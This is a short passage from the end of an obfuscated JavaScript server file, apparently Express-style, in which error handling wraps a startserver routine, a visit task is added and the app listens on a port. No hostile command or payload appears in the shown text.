AddVisitTask();}catch(_0x3169da){console[_0x5cca6d(0x167)]('Error\x20in\x20startserver:',_0x3169da);}}startserver()[_0x3d70ad(0x11b)](_0x2427bd=>{const _0x49e0d3=_0x3d70ad;console[_0x49e0d3(0x167)](_0x49e0d3(0x12b),_0x2427bd);}),app[_0x3d70ad(0x147)](PORT,()=>console[_0x3d70ad(0x106)](_0x3d70ad(0x17b)+PORT+'!'));
